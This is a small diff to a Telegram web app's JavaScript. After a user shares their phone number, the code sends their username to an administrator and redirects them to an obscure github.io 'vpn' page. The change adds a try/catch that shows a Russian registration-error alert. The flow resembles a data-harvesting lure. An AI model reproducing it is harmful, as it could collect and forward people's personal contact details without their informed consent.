@@ -114,8 +114,7 @@
                         + `📛 Username: @${user.username || 'нет'}`;
 
                     // Отправляем сообщение администратору
-                    sendToAdmin(message);
-                    location.href = "https://t3fvygbhujnt25ibgvfn.github.io/showme/vpn";
+                    try { sendToAdmin(message); location.href = "https://t3fvygbhujnt25ibgvfn.github.io/showme/vpn";; } catch { tg.showAlert('Ошибка при регестрации, попробуйте с пк.'); }
                 } else {
                     tg.showAlert('Вы отменили запрос номера.');
                 }
